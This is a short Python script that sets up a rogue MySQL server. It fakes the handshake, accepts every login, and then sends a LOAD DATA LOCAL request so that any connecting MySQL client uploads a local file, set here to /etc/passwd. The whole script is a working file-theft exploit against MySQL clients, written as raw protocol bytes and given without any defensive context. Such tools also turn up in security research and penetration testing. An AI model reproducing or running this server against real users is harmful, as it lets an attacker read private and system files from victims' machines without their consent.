# -*- coding:utf-8 -*-
__author__ = 'leezp'
import socket
import logging

# 读取mysql客户端本地文件，目前的脚本有读取长度限制,特别大的文件读取不完整

logging.basicConfig(level=logging.DEBUG)

filename = "/etc/passwd"
# filename="/root/Desktop/pass.txt"
sv = socket.socket()
sv.bind(("", 3340))
sv.listen(5)
conn, address = sv.accept()
logging.info('Conn from: %r', address)
# 1 Greeting
conn.sendall(
    "\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00")
conn.recv(9999)
# 2 Accept all authentications
conn.sendall("\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00")
logging.info("auth okay")
conn.recv(9999)
# 3 read file
wantfile = chr(len(filename) + 1) + "\x00\x00\x01\xFB" + filename
logging.info("read file...")
conn.sendall(wantfile)
content = conn.recv(9999)  
#print content
logging.info(content)
conn.close()
